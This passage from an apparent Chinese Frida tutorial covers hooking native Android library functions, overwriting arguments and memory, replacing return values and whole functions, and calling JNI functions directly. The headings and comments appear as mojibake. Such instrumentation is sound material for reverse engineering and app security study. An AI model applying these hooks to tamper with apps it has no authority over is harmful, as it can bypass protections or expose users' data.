class="comment">//ä¿®æ”¹è¿”å›å€¼ä¸º2000</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>, retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿®æ”¹å‚æ•°ç”¨ptr() ä¿®æ”¹è¿”å›å€¼ ç”¨ .replace()</span></span><br></pre></td></tr></table></figure><h2 id="Hookæœªå¯¼å‡ºå‡½æ•°">Hookæœªå¯¼å‡ºå‡½æ•°</h2><p>å½“æ˜¯32ä½.soæ˜¯ï¼Œä¸ºå¯¼å‡ºå‡½æ•°çš„åœ°å€+1ï¼Œä¹Ÿå¯ä»¥çœ‹å‡½æ•°åå…­è¿›åˆ¶æ˜¯å¦æ˜¯2ä¸ª å¦‚æœæ˜¯ä¸¤ä¸ªå°±æ˜¯thumb</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest4</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> funcAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x23F4</span>); <span class="comment">//å‡½æ•°åœ°å€è®¡ç®— thumb+1 ARMä¸åŠ </span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(funcAddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(funcAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(retval));   <span class="comment">//æ‰“å°å‡ºå†…å­˜ç»“æ„ </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è·å–æŒ‡é’ˆå‚æ•°è¿”å›å€¼">è·å–æŒ‡é’ˆå‚æ•°è¿”å›å€¼</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> sub_208C = soAddr.<span class="title function_">add</span>(<span class="number">0x208C</span>); <span class="comment">//å‡½æ•°åœ°å€è®¡ç®— thumb+1 ARMä¸åŠ </span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_208C);</span><br><span class="line">    <span class="keyword">if</span>(sub_208C != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_208C,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args1</span> = args[<span class="number">1</span>];   <span class="comment">//å›å»ç¬¬äºŒä¸ªå‚æ•°å€¼</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="comment">//ä¿®æ”¹å†…å­˜æ•°æ®</span></span><br><span class="line">                <span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">args1</span>).<span class="title function_">writeByteArray</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;0123456789abcdef0123456789abcdef&quot;</span>));</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹å†…å­˜æ•°æ®">ä¿®æ”¹å†…å­˜æ•°æ®</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">if</span>(soAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">//è¯»å–æŒ‡å®šåœ°å€çš„å­—ç¬¦ä¸² dumpæŒ‡å®šå†…å­˜</span></span><br><span class="line">        <span class="comment">//console.log(soAddr.add(0x2C00).readCString());</span></span><br><span class="line">        <span class="comment">//console.log(hexdump(soAddr.add(0x2C00)));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¯»å†…å­˜</span></span><br><span class="line">        <span class="comment">//var strByte = soAddr.add(0x2C00).readByteArray(16); </span></span><br><span class="line">        <span class="comment">//console.log(strByte);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å†™å†…å­˜</span></span><br><span class="line">        <span class="comment">//so|Addr.add(0x2C00).writeByteArray(stringToBytes(&quot;xiaojianbang&quot;)); </span></span><br><span class="line">        <span class="comment">//è¯»å–æŒ‡å®šåœ°å€çš„å­—ç¬¦ä¸² dumpæŒ‡å®šå†…å­˜</span></span><br><span class="line">        <span class="comment">//console.log(hexdump(soAddr.add(0x2C00)));  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//var bytes = Memory.readByteArray(soAddr.add(0x2C00), 16); //åŸå…ˆAPI</span></span><br><span class="line">        <span class="comment">//console.log(bytes);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-dlopen">Hook dlopen</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(dlopen);</span><br><span class="line">    <span class="keyword">if</span>(dlopen != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopen,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hookTest5</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ–°ç‰ˆæœ¬hook dlopen</span></span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(android_dlopen_ext);</span><br><span class="line">    <span class="keyword">if</span>(android_dlopen_ext != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();  <span class="comment">//dlopenå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯.soè·¯å¾„</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hookTest5</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookTest6</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h2 id="ä¸»åŠ¨è°ƒç”¨JNIå‡½æ•°">ä¸»åŠ¨è°ƒç”¨JNIå‡½æ•°</h2><p>å½“.soæ–‡ä»¶æŸä¸ªå‡½æ•°æŠŠcstringè½¬æ¢ä¸ºjstringå¯¹è±¡(newStringUtf)ï¼Œä¸èƒ½æ‰“å°å†…å­˜æ•°æ®ï¼Œéœ€è¦æŠŠä»–è½¬åŒ–ä¸ºcstringã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_helloFromC&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(funcAddr);</span><br><span class="line">    <span class="keyword">if</span>(funcAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">                <span class="keyword">var</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;bbs.125.la&quot;</span>);  <span class="comment">//ä¸»åŠ¨è°ƒç”¨jniå‡½æ•° cstrè½¬jstr</span></span><br><span class="line">                retval.<span class="title function_">replace</span>(jstr);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> cstr = env.<span class="title function_">getStringUtfChars</span>(jstr); <span class="comment">//ä¸»åŠ¨è°ƒç”¨ jstrè½¬cstr</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(cstr));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-libart-so-æ¥Hook-jniç›¸å…³å‡½æ•°">Hook <a href="http://libart.so">libart.so</a> æ¥Hook jniç›¸å…³å‡½æ•°</h2><p>libart.soæ˜¯artè™šæ‹Ÿæœºï¼Œjniå‡½æ•°å¯ä»¥åœ¨libart.soçš„ç¬¦å·è¡¨ä¸­æ‰¾åˆ°,ä¹Ÿå°±æ˜¯jniå‡½æ•°éƒ½åœ¨libart.soä¸­ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest10</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> artSym = <span class="title class_">Module</span>.<span class="title function_">enumerateSymbols</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTFAddr</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; artSym.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(artSym[i].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; artSym[i].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;NewStringUTF&quot;</span>) != -<span class="number">1</span>)&#123;    <span class="comment">//libartä¸­jniå‡½æ•°æ˜¯ä¸å¸¦æœ‰CheckJNIçš„</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(artSym[i]));</span><br><span class="line">            <span class="title class_">NewStringUTFAddr</span> = artSym[i].<span class="property">address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">NewStringUTFAddr</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">NewStringUTFAddr</span>,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-jniå‡½æ•°-è®¡ç®—åœ°å€æ–¹å¼">Hook jniå‡½æ•° (è®¡ç®—åœ°å€æ–¹å¼)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest9</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//æŸ¥çœ‹appæ˜¯å¤šå°‘ä½ 64ä½æŒ‡é’ˆ8å­—èŠ‚ 32ä½æŒ‡é’ˆ4å­—èŠ‚</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Process.arch: &quot;</span>, <span class="title class_">Process</span>.<span class="property">arch</span>);  </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>()));</span><br><span class="line">        <span class="comment">//(*(*a1 + 1336LL))(a1, a2);</span></span><br><span class="line">        <span class="comment">//*a1</span></span><br><span class="line">        <span class="keyword">var</span> envAddr = <span class="title function_">ptr</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="comment">//*(*a1 + 1336LL)</span></span><br><span class="line">        <span class="comment">//è¿™ä¸ªjniå‡½æ•°ç›¸å¯¹åç§»åœ°å€ 0x538 (é€šè¿‡çœ‹jni.h--&gt;ï¼ˆåœ¨ç»“æ„ä½“ä¸­çš„ä½ç½®-1ï¼‰*4æˆ–8)</span></span><br><span class="line">        <span class="keyword">var</span> newStringUtfAddr = envAddr.<span class="title function_">add</span>(<span class="number">0x538</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newStringUtfAddr&quot;</span>, newStringUtfAddr);</span><br><span class="line">        <span class="keyword">if</span>(newStringUtfAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(newStringUtfAddr,&#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="soå±‚ä¸»åŠ¨è°ƒç”¨ä»»æ„å‡½æ•°">soå±‚ä¸»åŠ¨è°ƒç”¨ä»»æ„å‡½æ•°</h2><p>Java.vm.tryGetEnvè¦ä¹ˆæ”¾åœ¨APIä¸­(Interceptor.attach)ï¼Œè¦ä¹ˆç”¨Java.performåŒ…èµ·æ¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest11</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//æ‹¿åˆ°å‡½æ•°åœ°å€</span></span><br><span class="line">        <span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x23F4</span>);</span><br><span class="line">        <span class="comment">//å£°æ˜å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(funcAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">        <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;env: &quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(env));</span><br><span class="line">        <span class="keyword">if</span>(env != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;abcgda&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> cstr = <span class="title function_">func</span>(env, jstr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(cstr));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ›¿æ¢soå±‚æŸä¸ªå‡½æ•°çš„åŠŸèƒ½">æ›¿æ¢soå±‚æŸä¸ªå‡½æ•°çš„åŠŸèƒ½</h2><p>ä½¿ç”¨ Interceptor.replace(target, replacement[, data])</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_Interceptor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">       <span class="comment">//è¿™ä¸ªc_getSumæ–¹æ³•æœ‰ä¸¤ä¸ªintå‚æ•°ã€è¿”å›ç»“æœä¸ºä¸¤ä¸ªå‚æ•°ç›¸åŠ </span></span><br><span class="line">       <span class="comment">//è¿™é‡Œç”¨NativeFunctionå‡½æ•°è‡ªå·±å®šä¹‰äº†ä¸€ä¸ªc_getSumå‡½æ•°</span></span><br><span class="line">       <span class="keyword">var</span> add_method = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libhello.so&#x27;</span>, <span class="string">&#x27;c_getSum&#x27;</span>), </span><br><span class="line">       <span class="string">&#x27;int&#x27;</span>,[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">       <span class="comment">//è¾“å‡ºç»“æœ é‚£ç»“æœè‚¯å®šå°±æ˜¯ 3</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">add_method</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">       <span class="comment">//è¿™é‡Œå¯¹åŸå‡½æ•°çš„åŠŸèƒ½è¿›è¡Œæ›¿æ¢å®ç°</span></span><br><span class="line">       <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(add_method, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">           <span class="comment">//hä¸è®ºæ˜¯ä»€ä¹ˆå‚æ•°éƒ½è¿”å›123</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">       &#125;, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]));</span><br><span class="line">       <span class="comment">//å†æ¬¡è°ƒç”¨ åˆ™è¿”å›123</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>,<span class="title function_">add_method</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="writePointer-ptr">writePointer(ptr)</h2><p>è¯»å–ptræŒ‡é’ˆåœ°å€åˆ°å½“å‰æŒ‡é’ˆ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…ˆæ‰“å°pointeræŒ‡é’ˆåœ°å€</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pointer :&quot;</span>+pointer);</span><br><span class="line"><span class="comment">//åˆ†é…å››ä¸ªå­—èŠ‚çš„ç©ºé—´åœ°å€</span></span><br><span class="line"><span class="keyword">const</span> r = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//å°†pointeræŒ‡é’ˆå†™å…¥åˆšåˆšç”³è¯·çš„rå†…</span></span><br><span class="line">r.<span class="title function_">writePointer</span>(pointer);</span><br><span class="line"><span class="comment">//è¯»å–ræŒ‡é’ˆçš„æ•°æ®</span></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(r, <span class="number">4</span>);</span><br><span class="line"><span class="comment">//ræŒ‡é’ˆå†…æ”¾çš„pointeræŒ‡é’ˆåœ°å€</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buffer);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºå¦‚ä¸‹ã€‚</span><br><span class="line"><span 